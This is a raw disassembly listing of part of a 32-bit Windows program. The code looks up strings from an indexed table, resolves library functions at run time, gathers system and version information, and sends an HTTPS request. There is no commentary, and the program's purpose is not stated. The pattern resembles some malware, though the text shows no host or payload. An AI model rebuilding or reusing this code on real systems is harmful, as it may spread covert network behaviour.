  404427:	33 c0                	xor    %eax,%eax
  404429:	e8 72 15 00 00       	call   0x4059a0
  40442e:	83 c4 04             	add    $0x4,%esp
  404431:	eb 65                	jmp    0x404498
  404433:	8b 35 14 81 40 00    	mov    0x408114,%esi
  404439:	6a 00                	push   $0x0
  40443b:	6a 00                	push   $0x0
  40443d:	8d 54 24 18          	lea    0x18(%esp),%edx
  404441:	52                   	push   %edx
  404442:	68 70 42 40 00       	push   $0x404270
  404447:	6a 00                	push   $0x0
  404449:	6a 00                	push   $0x0
  40444b:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  404452:	00 
  404453:	c6 44 24 2c 01       	movb   $0x1,0x2c(%esp)
  404458:	ff d6                	call   *%esi
  40445a:	6a 00                	push   $0x0
  40445c:	6a 00                	push   $0x0
  40445e:	6a 00                	push   $0x0
  404460:	68 90 42 40 00       	push   $0x404290
  404465:	6a 00                	push   $0x0
  404467:	6a 00                	push   $0x0
  404469:	89 44 24 20          	mov    %eax,0x20(%esp)
  40446d:	ff d6                	call   *%esi
  40446f:	6a ff                	push   $0xffffffff
  404471:	89 44 24 10          	mov    %eax,0x10(%esp)
  404475:	6a 01                	push   $0x1
  404477:	8d 44 24 10          	lea    0x10(%esp),%eax
  40447b:	50                   	push   %eax
  40447c:	6a 02                	push   $0x2
  40447e:	ff 15 28 81 40 00    	call   *0x408128
  404484:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404488:	8b 35 48 81 40 00    	mov    0x408148,%esi
  40448e:	51                   	push   %ecx
  40448f:	ff d6                	call   *%esi
  404491:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404495:	52                   	push   %edx
  404496:	ff d6                	call   *%esi
  404498:	e8 63 00 00 00       	call   0x404500
  40449d:	a1 50 b2 41 00       	mov    0x41b250,%eax
  4044a2:	85 c0                	test   %eax,%eax
  4044a4:	74 49                	je     0x4044ef
  4044a6:	8b 08                	mov    (%eax),%ecx
  4044a8:	85 c9                	test   %ecx,%ecx
  4044aa:	8b d1                	mov    %ecx,%edx
  4044ac:	74 41                	je     0x4044ef
  4044ae:	8b 42 04             	mov    0x4(%edx),%eax
  4044b1:	85 c0                	test   %eax,%eax
  4044b3:	74 09                	je     0x4044be
  4044b5:	8b d0                	mov    %eax,%edx
  4044b7:	8b 42 04             	mov    0x4(%edx),%eax
  4044ba:	85 c0                	test   %eax,%eax
  4044bc:	75 f7                	jne    0x4044b5
  4044be:	83 3a 00             	cmpl   $0x0,(%edx)
  4044c1:	74 2c                	je     0x4044ef
  4044c3:	8b 41 04             	mov    0x4(%ecx),%eax
  4044c6:	85 c0                	test   %eax,%eax
  4044c8:	74 0f                	je     0x4044d9
  4044ca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4044d0:	8b c8                	mov    %eax,%ecx
  4044d2:	8b 41 04             	mov    0x4(%ecx),%eax
  4044d5:	85 c0                	test   %eax,%eax
  4044d7:	75 f7                	jne    0x4044d0
  4044d9:	8b 09                	mov    (%ecx),%ecx
  4044db:	e8 90 e8 ff ff       	call   0x402d70
  4044e0:	85 d2                	test   %edx,%edx
  4044e2:	7c 0b                	jl     0x4044ef
  4044e4:	7f 04                	jg     0x4044ea
  4044e6:	85 c0                	test   %eax,%eax
  4044e8:	76 05                	jbe    0x4044ef
  4044ea:	e8 41 2c 00 00       	call   0x407130
  4044ef:	33 c0                	xor    %eax,%eax
  4044f1:	5e                   	pop    %esi
  4044f2:	5b                   	pop    %ebx
  4044f3:	83 c4 14             	add    $0x14,%esp
  4044f6:	e9 05 32 00 00       	jmp    0x407700
  4044fb:	cc                   	int3
  4044fc:	cc                   	int3
  4044fd:	cc                   	int3
  4044fe:	cc                   	int3
  4044ff:	cc                   	int3
  404500:	8b 15 50 b2 41 00    	mov    0x41b250,%edx
  404506:	81 ec 34 04 00 00    	sub    $0x434,%esp
  40450c:	85 d2                	test   %edx,%edx
  40450e:	53                   	push   %ebx
  40450f:	55                   	push   %ebp
  404510:	56                   	push   %esi
  404511:	57                   	push   %edi
  404512:	0f 84 4f 03 00 00    	je     0x404867
  404518:	8b 02                	mov    (%edx),%eax
  40451a:	85 c0                	test   %eax,%eax
  40451c:	0f 84 45 03 00 00    	je     0x404867
  404522:	8b 48 04             	mov    0x4(%eax),%ecx
  404525:	85 c9                	test   %ecx,%ecx
  404527:	74 10                	je     0x404539
  404529:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404530:	8b c1                	mov    %ecx,%eax
  404532:	8b 48 04             	mov    0x4(%eax),%ecx
  404535:	85 c9                	test   %ecx,%ecx
  404537:	75 f7                	jne    0x404530
  404539:	83 38 00             	cmpl   $0x0,(%eax)
  40453c:	0f 84 25 03 00 00    	je     0x404867
  404542:	e8 89 20 00 00       	call   0x4065d0
  404547:	8b 0a                	mov    (%edx),%ecx
  404549:	85 c9                	test   %ecx,%ecx
  40454b:	74 12                	je     0x40455f
  40454d:	8b 41 04             	mov    0x4(%ecx),%eax
  404550:	85 c0                	test   %eax,%eax
  404552:	74 09                	je     0x40455d
  404554:	8b c8                	mov    %eax,%ecx
  404556:	8b 41 04             	mov    0x4(%ecx),%eax
  404559:	85 c0                	test   %eax,%eax
  40455b:	75 f7                	jne    0x404554
  40455d:	8b 09                	mov    (%ecx),%ecx
  40455f:	8b 41 34             	mov    0x34(%ecx),%eax
  404562:	33 d2                	xor    %edx,%edx
  404564:	33 f6                	xor    %esi,%esi
  404566:	85 c0                	test   %eax,%eax
  404568:	74 20                	je     0x40458a
  40456a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404570:	8b 88 48 00 01 00    	mov    0x10048(%eax),%ecx
  404576:	03 d1                	add    %ecx,%edx
  404578:	8b 88 4c 00 01 00    	mov    0x1004c(%eax),%ecx
  40457e:	8b 80 50 00 01 00    	mov    0x10050(%eax),%eax
  404584:	13 f1                	adc    %ecx,%esi
  404586:	85 c0                	test   %eax,%eax
  404588:	75 e6                	jne    0x404570
  40458a:	6a 00                	push   $0x0
  40458c:	6a 64                	push   $0x64
  40458e:	56                   	push   %esi
  40458f:	52                   	push   %edx
  404590:	e8 ab 34 00 00       	call   0x407a40
  404595:	6a 00                	push   $0x0
  404597:	68 00 00 00 40       	push   $0x40000000
  40459c:	52                   	push   %edx
  40459d:	50                   	push   %eax
  40459e:	e8 0d 33 00 00       	call   0x4078b0
  4045a3:	8b fa                	mov    %edx,%edi
  4045a5:	8d 54 24 24          	lea    0x24(%esp),%edx
  4045a9:	52                   	push   %edx
  4045aa:	8b f0                	mov    %eax,%esi
  4045ac:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4045b1:	6a 2c                	push   $0x2c
  4045b3:	e8 98 e3 ff ff       	call   0x402950
  4045b8:	8b e8                	mov    %eax,%ebp
  4045ba:	85 ed                	test   %ebp,%ebp
  4045bc:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  4045c0:	0f 84 a1 02 00 00    	je     0x404867
  4045c6:	6a 00                	push   $0x0
  4045c8:	6a 64                	push   $0x64
  4045ca:	57                   	push   %edi
  4045cb:	56                   	push   %esi
  4045cc:	e8 8f 33 00 00       	call   0x407960
  4045d1:	53                   	push   %ebx
  4045d2:	51                   	push   %ecx
  4045d3:	52                   	push   %edx
  4045d4:	50                   	push   %eax
  4045d5:	a1 10 90 41 00       	mov    0x419010,%eax
  4045da:	50                   	push   %eax
  4045db:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  4045df:	55                   	push   %ebp
  4045e0:	51                   	push   %ecx
  4045e1:	ff 15 80 81 40 00    	call   *0x408180
  4045e7:	83 c4 1c             	add    $0x1c,%esp
  4045ea:	8d 54 24 40          	lea    0x40(%esp),%edx
  4045ee:	52                   	push   %edx
  4045ef:	e8 dc 1f 00 00       	call   0x4065d0
  4045f4:	83 c4 04             	add    $0x4,%esp
  4045f7:	8d 44 24 24          	lea    0x24(%esp),%eax
  4045fb:	33 db                	xor    %ebx,%ebx
  4045fd:	50                   	push   %eax
  4045fe:	a1 80 b2 41 00       	mov    0x41b280,%eax
  404603:	6a 29                	push   $0x29
  404605:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  404609:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  40460d:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  404611:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  404615:	e8 36 e3 ff ff       	call   0x402950
  40461a:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40461e:	8b f8                	mov    %eax,%edi
  404620:	a1 80 b2 41 00       	mov    0x41b280,%eax
  404625:	51                   	push   %ecx
  404626:	6a 2a                	push   $0x2a
  404628:	89 7c 24 40          	mov    %edi,0x40(%esp)
  40462c:	e8 1f e3 ff ff       	call   0x402950
  404631:	8d 54 24 24          	lea    0x24(%esp),%edx
  404635:	52                   	push   %edx
  404636:	89 44 24 30          	mov    %eax,0x30(%esp)
  40463a:	a1 80 b2 41 00       	mov    0x41b280,%eax
  40463f:	6a 2b                	push   $0x2b
  404641:	88 5c 24 1f          	mov    %bl,0x1f(%esp)
  404645:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  404649:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  40464d:	e8 fe e2 ff ff       	call   0x402950
  404652:	8b e8                	mov    %eax,%ebp
  404654:	3b eb                	cmp    %ebx,%ebp
  404656:	0f 84 f5 00 00 00    	je     0x404751
  40465c:	8b 44 24 24          	mov    0x24(%esp),%eax
  404660:	50                   	push   %eax
  404661:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404665:	51                   	push   %ecx
  404666:	8b c5                	mov    %ebp,%eax
  404668:	e8 33 ea ff ff       	call   0x4030a0
  40466d:	8b 74 24 20          	mov    0x20(%esp),%esi
  404671:	85 f6                	test   %esi,%esi
  404673:	74 0a                	je     0x40467f
  404675:	39 5c 24 1c          	cmp    %ebx,0x1c(%esp)
  404679:	7e 04                	jle    0x40467f
  40467b:	8b 06                	mov    (%esi),%eax
  40467d:	eb 02                	jmp    0x404681
  40467f:	33 c0                	xor    %eax,%eax
  404681:	50                   	push   %eax
  404682:	ff 15 9c 80 40 00    	call   *0x40809c
  404688:	8b f8                	mov    %eax,%edi
  40468a:	85 ff                	test   %edi,%edi
  40468c:	0f 84 ab 00 00 00    	je     0x40473d
  404692:	85 f6                	test   %esi,%esi
  404694:	74 0c                	je     0x4046a2
  404696:	83 7c 24 1c 01       	cmpl   $0x1,0x1c(%esp)
  40469b:	7e 05                	jle    0x4046a2
  40469d:	8b 46 04             	mov    0x4(%esi),%eax
  4046a0:	eb 02                	jmp    0x4046a4
  4046a2:	33 c0                	xor    %eax,%eax
  4046a4:	8b 1d 98 80 40 00    	mov    0x408098,%ebx
  4046aa:	50                   	push   %eax
  4046ab:	57                   	push   %edi
  4046ac:	ff d3                	call   *%ebx
  4046ae:	85 f6                	test   %esi,%esi
  4046b0:	89 44 24 30          	mov    %eax,0x30(%esp)
  4046b4:	74 0c                	je     0x4046c2
  4046b6:	83 7c 24 1c 02       	cmpl   $0x2,0x1c(%esp)
  4046bb:	7e 05                	jle    0x4046c2
  4046bd:	8b 46 08             	mov    0x8(%esi),%eax
  4046c0:	eb 02                	jmp    0x4046c4
  4046c2:	33 c0                	xor    %eax,%eax
  4046c4:	50                   	push   %eax
  4046c5:	57                   	push   %edi
  4046c6:	ff d3                	call   *%ebx
  4046c8:	85 f6                	test   %esi,%esi
  4046ca:	89 44 24 28          	mov    %eax,0x28(%esp)
  4046ce:	74 0c                	je     0x4046dc
  4046d0:	83 7c 24 1c 03       	cmpl   $0x3,0x1c(%esp)
  4046d5:	7e 05                	jle    0x4046dc
  4046d7:	8b 46 0c             	mov    0xc(%esi),%eax
  4046da:	eb 02                	jmp    0x4046de
  4046dc:	33 c0                	xor    %eax,%eax
  4046de:	50                   	push   %eax
  4046df:	57                   	push   %edi
  4046e0:	ff d3                	call   *%ebx
  4046e2:	85 f6                	test   %esi,%esi
  4046e4:	89 44 24 34          	mov    %eax,0x34(%esp)
  4046e8:	74 0c                	je     0x4046f6
  4046ea:	83 7c 24 1c 04       	cmpl   $0x4,0x1c(%esp)
  4046ef:	7e 05                	jle    0x4046f6
  4046f1:	8b 46 10             	mov    0x10(%esi),%eax
  4046f4:	eb 02                	jmp    0x4046f8
  4046f6:	33 c0                	xor    %eax,%eax
  4046f8:	50                   	push   %eax
  4046f9:	57                   	push   %edi
  4046fa:	ff d3                	call   *%ebx
  4046fc:	85 f6                	test   %esi,%esi
  4046fe:	89 44 24 18          	mov    %eax,0x18(%esp)
  404702:	74 0c                	je     0x404710
  404704:	83 7c 24 1c 05       	cmpl   $0x5,0x1c(%esp)
  404709:	7e 05                	jle    0x404710
  40470b:	8b 76 14             	mov    0x14(%esi),%esi
  40470e:	eb 02                	jmp    0x404712
  404710:	33 f6                	xor    %esi,%esi
  404712:	56                   	push   %esi
  404713:	57                   	push   %edi
  404714:	ff d3                	call   *%ebx
  404716:	83 7c 24 30 00       	cmpl   $0x0,0x30(%esp)
  40471b:	8b d8                	mov    %eax,%ebx
  40471d:	74 1e                	je     0x40473d
  40471f:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  404724:	74 17                	je     0x40473d
  404726:	83 7c 24 34 00       	cmpl   $0x0,0x34(%esp)
  40472b:	74 10                	je     0x40473d
  40472d:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  404732:	74 09                	je     0x40473d
  404734:	85 db                	test   %ebx,%ebx
  404736:	74 05                	je     0x40473d
  404738:	c6 44 24 17 01       	movb   $0x1,0x17(%esp)
  40473d:	55                   	push   %ebp
  40473e:	6a 00                	push   $0x0
  404740:	ff 15 90 80 40 00    	call   *0x408090
  404746:	50                   	push   %eax
  404747:	ff 15 8c 80 40 00    	call   *0x40808c
  40474d:	8b 7c 24 38          	mov    0x38(%esp),%edi
  404751:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  404755:	e8 06 ea ff ff       	call   0x403160
  40475a:	85 ff                	test   %edi,%edi
  40475c:	0f 84 f1 00 00 00    	je     0x404853
  404762:	83 7c 24 2c 00       	cmpl   $0x0,0x2c(%esp)
  404767:	0f 84 e6 00 00 00    	je     0x404853
  40476d:	80 7c 24 17 00       	cmpb   $0x0,0x17(%esp)
  404772:	0f 84 db 00 00 00    	je     0x404853
  404778:	6a 00                	push   $0x0
  40477a:	6a 00                	push   $0x0
  40477c:	6a 00                	push   $0x0
  40477e:	6a 00                	push   $0x0
  404780:	68 dc 81 40 00       	push   $0x4081dc
  404785:	ff 54 24 48          	call   *0x48(%esp)
  404789:	8b e8                	mov    %eax,%ebp
  40478b:	85 ed                	test   %ebp,%ebp
  40478d:	0f 84 a1 00 00 00    	je     0x404834
  404793:	6a 00                	push   $0x0
  404795:	6a 00                	push   $0x0
  404797:	6a 03                	push   $0x3
  404799:	6a 00                	push   $0x0
  40479b:	6a 00                	push   $0x0
  40479d:	68 bb 01 00 00       	push   $0x1bb
  4047a2:	57                   	push   %edi
  4047a3:	55                   	push   %ebp
  4047a4:	ff d3                	call   *%ebx
  4047a6:	8b f0                	mov    %eax,%esi
  4047a8:	85 f6                	test   %esi,%esi
  4047aa:	74 72                	je     0x40481e
  4047ac:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4047b0:	6a 00                	push   $0x0
  4047b2:	68 00 00 80 80       	push   $0x80800000
  4047b7:	6a 00                	push   $0x0
  4047b9:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  4047bd:	52                   	push   %edx
  4047be:	6a 00                	push   $0x0
  4047c0:	50                   	push   %eax
  4047c1:	6a 00                	push   $0x0
  4047c3:	56                   	push   %esi
  4047c4:	ff 54 24 50          	call   *0x50(%esp)
  4047c8:	8b f8                	mov    %eax,%edi
  4047ca:	85 ff                	test   %edi,%edi
  4047cc:	74 31                	je     0x4047ff
  4047ce:	6a 00                	push   $0x0
  4047d0:	6a 00                	push   $0x0
  4047d2:	6a 00                	push   $0x0
  4047d4:	6a 00                	push   $0x0
  4047d6:	57                   	push   %edi
  4047d7:	ff 54 24 3c          	call   *0x3c(%esp)
  4047db:	ff 15 04 81 40 00    	call   *0x408104
  4047e1:	50                   	push   %eax
  4047e2:	e8 e9 1d 00 00       	call   0x4065d0
  4047e7:	83 c4 04             	add    $0x4,%esp
  4047ea:	57                   	push   %edi
  4047eb:	ff 54 24 1c          	call   *0x1c(%esp)
  4047ef:	56                   	push   %esi
  4047f0:	ff 54 24 1c          	call   *0x1c(%esp)
  4047f4:	8b 7c 24 38          	mov    0x38(%esp),%edi
  4047f8:	55                   	push   %ebp
  4047f9:	ff 54 24 1c          	call   *0x1c(%esp)
  4047fd:	eb 44                	jmp    0x404843
  4047ff:	ff 15 04 81 40 00    	call   *0x408104
  404805:	50                   	push   %eax
  404806:	e8 c5 1d 00 00       	call   0x4065d0
  40480b:	83 c4 04             	add    $0x4,%esp
  40480e:	56                   	push   %esi
  40480f:	ff 54 24 1c          	call   *0x1c(%esp)
  404813:	8b 7c 24 38          	mov    0x38(%esp),%edi
  404817:	55                   	push   %ebp
  404818:	ff 54 24 1c          	call   *0x1c(%esp)
  40481c:	eb 25                	jmp    0x404843
  40481e:	ff 15 04 81 40 00    	call   *0x408104
  404824:	50                   	push   %eax
  404825:	e8 a6 1d 00 00       	call   0x4065d0
  40482a:	83 c4 04             	add    $0x4,%esp
  40482d:	55                   	push   %ebp
  40482e:	ff 54 24 1c          	call   *0x1c(%esp)
  404832:	eb 0f                	jmp    0x404843
  404834:	ff 15 04 81 40 00    	call   *0x408104
  40483a:	50                   	push   %eax
  40483b:	e8 90 1d 00 00       	call   0x4065d0
  404840:	83 c4 04             	add    $0x4,%esp
  404843:	8b c7                	mov    %edi,%eax
  404845:	e8 06 fa ff ff       	call   0x404250
  40484a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40484e:	e8 fd f9 ff ff       	call   0x404250
  404853:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  404857:	51                   	push   %ecx
  404858:	6a 00                	push   $0x0
  40485a:	ff 15 90 80 40 00    	call   *0x408090
  404860:	50                   	push   %eax
  404861:	ff 15 8c 80 40 00    	call   *0x40808c
  404867:	5f                   	pop    %edi
  404868:	5e                   	pop    %esi
  404869:	5d                   	pop    %ebp
  40486a:	5b                   	pop    %ebx
  40486b:	81 c4 34 04 00 00    	add    $0x434,%esp
  404871:	c3                   	ret
  404872:	cc                   	int3
  404873:	cc                   	int3
  404874:	cc                   	int3
  404875:	cc                   	int3
  404876:	cc                   	int3
  404877:	cc                   	int3
  404878:	cc                   	int3
  404879:	cc                   	int3
  40487a:	cc                   	int3
  40487b:	cc                   	int3
  40487c:	cc                   	int3
  40487d:	cc                   	int3
  40487e:	cc                   	int3
  40487f:	cc                   	int3
  404880:	51                   	push   %ecx
  404881:	53                   	push   %ebx
  404882:	55                   	push   %ebp
  404883:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  404889:	56                   	push   %esi
  40488a:	57                   	push   %edi
  40488b:	be 00 10 00 00       	mov    $0x1000,%esi
  404890:	56                   	push   %esi
  404891:	6a 00                	push   $0x0
  404893:	ff d5                	call   *%ebp
  404895:	50                   	push   %eax
  404896:	ff 15 84 80 40 00    	call   *0x408084
  40489c:	8b f8                	mov    %eax,%edi
  40489e:	8d 44 24 10          	lea    0x10(%esp),%eax
  4048a2:	50                   	push   %eax
  4048a3:	56                   	push   %esi
  4048a4:	57                   	push   %edi
  4048a5:	6a 03                	push   $0x3
  4048a7:	6a 00                	push   $0x0
  4048a9:	ff 15 8c b2 41 00    	call   *0x41b28c
  4048af:	8b d8                	mov    %eax,%ebx
  4048b1:	81 fb 04 00 00 c0    	cmp    $0xc0000004,%ebx
  4048b7:	75 4e                	jne    0x404907
  4048b9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4048c0:	57                   	push   %edi
  4048c1:	6a 00                	push   $0x0
  4048c3:	ff d5                	call   *%ebp
  4048c5:	50                   	push   %eax
  4048c6:	ff 15 8c 80 40 00    	call   *0x40808c
  4048cc:	03 f6                	add    %esi,%esi
  4048ce:	81 fe 00 00 00 10    	cmp    $0x10000000,%esi
  4048d4:	77 49                	ja     0x40491f
  4048d6:	85 f6                	test   %esi,%esi
  4048d8:	74 10                	je     0x4048ea
  4048da:	56                   	push   %esi
  4048db:	6a 00                	push   $0x0
  4048dd:	ff d5                	call   *%ebp
  4048df:	50                   	push   %eax
  4048e0:	ff 15 84 80 40 00    	call   *0x408084
  4048e6:	8b f8                	mov    %eax,%edi
  4048e8:	eb 02                	jmp    0x4048ec
  4048ea:	33 ff                	xor    %edi,%edi
  4048ec:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4048f0:	51                   	push   %ecx
  4048f1:	56                   	push   %esi
  4048f2:	57                   	push   %edi
  4048f3:	6a 03                	push   $0x3
  4048f5:	6a 00                	push   $0x0
  4048f7:	ff 15 8c b2 41 00    	call   *0x41b28c
  4048fd:	8b d8                	mov    %eax,%ebx
  4048ff:	81 fb 04 00 00 c0    	cmp    $0xc0000004,%ebx
  404905:	74 b9                	je     0x4048c0
  404907:	85 db                	test   %ebx,%ebx
  404909:	7d 1f                	jge    0x40492a
  40490b:	57                   	push   %edi
  40490c:	6a 00                	push   $0x0
  40490e:	ff d5                	call   *%ebp
  404910:	50                   	push   %eax
  404911:	ff 15 8c 80 40 00    	call   *0x40808c
  404917:	5f                   	pop    %edi
  404918:	5e                   	pop    %esi
  404919:	5d                   	pop    %ebp
  40491a:	8b c3                	mov    %ebx,%eax
  40491c:	5b                   	pop    %ebx
  40491d:	59                   	pop    %ecx
  40491e:	c3                   	ret
  40491f:	5f                   	pop    %edi
  404920:	5e                   	pop    %esi
  404921:	5d                   	pop    %ebp
  404922:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
  404927:	5b                   	pop    %ebx
  404928:	59                   	pop    %ecx
  404929:	c3                   	ret
  40492a:	8b 54 24 18          	mov    0x18(%esp),%edx
  40492e:	89 3a                	mov    %edi,(%edx)
  404930:	5f                   	pop    %edi
  404931:	5e                   	pop    %esi
  404932:	5d                   	pop    %ebp
  404933:	8b c3                	mov    %ebx,%eax
  404935:	5b                   	pop    %ebx
  404936:	59                   	pop    %ecx
  404937:	c3                   	ret
  404938:	cc                   	int3
  404939:	cc                   	int3
  40493a:	cc                   	int3
  40493b:	cc                   	int3
  40493c:	cc                   	int3
  40493d:	cc                   	int3
  40493e:	cc                   	int3
  40493f:	cc                   	int3
  404940:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
  404946:	8d 04 24             	lea    (%esp),%eax
  404949:	50                   	push   %eax
  40494a:	c7 44 24 04 1c 01 00 	movl   $0x11c,0x4(%esp)
  404951:	00 
  404952:	ff 15 94 b2 41 00    	call   *0x41b294
  404958:	85 c0                	test   %eax,%eax
  40495a:	7d 09                	jge    0x404965
  40495c:	b0 01                	mov    $0x1,%al
  40495e:	81 c4 1c 01 00 00    	add    $0x11c,%esp
  404964:	c3                   	ret
  404965:	8b 44 24 04          	mov    0x4(%esp),%eax
  404969:	83 f8 06             	cmp    $0x6,%eax
  40496c:	77 ee                	ja     0x40495c
  40496e:	73 09                	jae    0x404979
  404970:	32 c0                	xor    %al,%al
  404972:	81 c4 1c 01 00 00    	add    $0x11c,%esp
  404978:	c3                   	ret
  404979:	83 7c 24 08 03       	cmpl   $0x3,0x8(%esp)
  40497e:	0f 93 c0             	setae  %al
  404981:	81 c4 1c 01 00 00    	add    $0x11c,%esp
  404987:	c3                   	ret
  404988:	cc                   	int3
  404989:	cc                   	int3
  40498a:	cc                   	int3
  40498b:	cc                   	int3
  40498c:	cc                   	int3
  40498d:	cc                   	int3
  40498e:	cc                   	int3
  40498f:	cc                   	int3
  404990:	55                   	push   %ebp
  404991:	8b ec                	mov    %esp,%ebp
  404993:	83 e4 f8             	and    $0xfffffff8,%esp
  404996:	83 ec 10             	sub    $0x10,%esp
  404999:	53                   	push   %ebx
  40499a:	55                   	push   %ebp
  40499b:	56                   	push   %esi
  40499c:	57                   	push   %edi
  40499d:	33 ff                	xor    %edi,%edi
  40499f:	39 3d 8c b2 41 00    	cmp    %edi,0x41b28c
  4049a5:	74 14                	je     0x4049bb
  4049a7:	39 3d 90 b2 41 00    	cmp    %edi,0x41b290
  4049ad:	74 0c                	je     0x4049bb
  4049af:	39 3d 94 b2 41 00    	cmp    %edi,0x41b294
  4049b5:	0f 85 8f 01 00 00    	jne    0x404b4a
  4049bb:	8d 44 24 10          	lea    0x10(%esp),%eax
  4049bf:	50                   	push   %eax
  4049c0:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4049c5:	6a 26                	push   $0x26
  4049c7:	89 7c 24 20          	mov    %edi,0x20(%esp)
  4049cb:	89 7c 24 24          	mov    %edi,0x24(%esp)
  4049cf:	e8 7c df ff ff       	call   0x402950
  4049d4:	3b c7                	cmp    %edi,%eax
  4049d6:	89 44 24 14          	mov    %eax,0x14(%esp)
  4049da:	0f 84 61 01 00 00    	je     0x404b41
  4049e0:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4049e4:	51                   	push   %ecx
  4049e5:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4049e9:	52                   	push   %edx
  4049ea:	e8 b1 e6 ff ff       	call   0x4030a0
  4049ef:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4049f3:	3b f7                	cmp    %edi,%esi
  4049f5:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4049f9:	74 0a                	je     0x404a05
  4049fb:	83 fd 01             	cmp    $0x1,%ebp
  4049fe:	7e 05                	jle    0x404a05
  404a00:	8b 4e 04             	mov    0x4(%esi),%ecx
  404a03:	eb 02                	jmp    0x404a07
  404a05:	33 c9                	xor    %ecx,%ecx
  404a07:	3b f7                	cmp    %edi,%esi
  404a09:	74 08                	je     0x404a13
  404a0b:	3b ef                	cmp    %edi,%ebp
  404a0d:	7e 04                	jle    0x404a13
  404a0f:	8b 06                	mov    (%esi),%eax
  404a11:	eb 02                	jmp    0x404a15
  404a13:	33 c0                	xor    %eax,%eax
  404a15:	8b 3d ac 80 40 00    	mov    0x4080ac,%edi
  404a1b:	51                   	push   %ecx
  404a1c:	50                   	push   %eax
  404a1d:	ff d7                	call   *%edi
  404a1f:	8b 1d 98 80 40 00    	mov    0x408098,%ebx
  404a25:	50                   	push   %eax
  404a26:	ff d3                	call   *%ebx
  404a28:	85 f6                	test   %esi,%esi
  404a2a:	a3 8c b2 41 00       	mov    %eax,0x41b28c
  404a2f:	74 0a                	je     0x404a3b
  404a31:	83 fd 02             	cmp    $0x2,%ebp
  404a34:	7e 05                	jle    0x404a3b
  404a36:	8b 4e 08             	mov    0x8(%esi),%ecx
  404a39:	eb 02                	jmp    0x404a3d
  404a3b:	33 c9                	xor    %ecx,%ecx
  404a3d:	85 f6                	test   %esi,%esi
  404a3f:	74 08                	je     0x404a49
  404a41:	85 ed                	test   %ebp,%ebp
  404a43:	7e 04                	jle    0x404a49
  404a45:	8b 06                	mov    (%esi),%eax
  404a47:	eb 02                	jmp    0x404a4b
  404a49:	33 c0                	xor    %eax,%eax
  404a4b:	51                   	push   %ecx
  404a4c:	50                   	push   %eax
  404a4d:	ff d7                	call   *%edi
  404a4f:	50                   	push   %eax
  404a50:	ff d3                	call   *%ebx
  404a52:	85 f6                	test   %esi,%esi
  404a54:	a3 90 b2 41 00       	mov    %eax,0x41b290
  404a59:	74 0a                	je     0x404a65
  404a5b:	83 fd 03             	cmp    $0x3,%ebp
  404a5e:	7e 05                	jle    0x404a65
  404a60:	8b 4e 0c             	mov    0xc(%esi),%ecx
  404a63:	eb 02                	jmp    0x404a67
  404a65:	33 c9                	xor    %ecx,%ecx
  404a67:	85 f6                	test   %esi,%esi
  404a69:	74 08                	je     0x404a73
  404a6b:	85 ed                	test   %ebp,%ebp
  404a6d:	7e 04                	jle    0x404a73
  404a6f:	8b 06                	mov    (%esi),%eax
  404a71:	eb 02                	jmp    0x404a75
  404a73:	33 c0                	xor    %eax,%eax
  404a75:	51                   	push   %ecx
  404a76:	50                   	push   %eax
  404a77:	ff d7                	call   *%edi
  404a79:	50                   	push   %eax
  404a7a:	ff d3                	call   *%ebx
  404a7c:	85 f6                	test   %esi,%esi
  404a7e:	a3 94 b2 41 00       	mov    %eax,0x41b294
  404a83:	74 0a                	je     0x404a8f
  404a85:	83 fd 05             	cmp    $0x5,%ebp
  404a88:	7e 05                	jle    0x404a8f
  404a8a:	8b 4e 14             	mov    0x14(%esi),%ecx
  404a8d:	eb 02                	jmp    0x404a91
  404a8f:	33 c9                	xor    %ecx,%ecx
  404a91:	85 f6                	test   %esi,%esi
  404a93:	74 0a                	je     0x404a9f
  404a95:	83 fd 04             	cmp    $0x4,%ebp
  404a98:	7e 05                	jle    0x404a9f
  404a9a:	8b 46 10             	mov    0x10(%esi),%eax
  404a9d:	eb 02                	jmp    0x404aa1
  404a9f:	33 c0                	xor    %eax,%eax
  404aa1:	51                   	push   %ecx
  404aa2:	50                   	push   %eax
  404aa3:	ff d7                	call   *%edi
  404aa5:	50                   	push   %eax
  404aa6:	ff d3                	call   *%ebx
  404aa8:	85 f6                	test   %esi,%esi
  404aaa:	a3 98 b2 41 00       	mov    %eax,0x41b298
  404aaf:	74 0a                	je     0x404abb
  404ab1:	83 fd 06             	cmp    $0x6,%ebp
  404ab4:	7e 05                	jle    0x404abb
  404ab6:	8b 46 18             	mov    0x18(%esi),%eax
  404ab9:	eb 02                	jmp    0x404abd
  404abb:	33 c0                	xor    %eax,%eax
  404abd:	85 f6                	test   %esi,%esi
  404abf:	74 0a                	je     0x404acb
  404ac1:	83 fd 04             	cmp    $0x4,%ebp
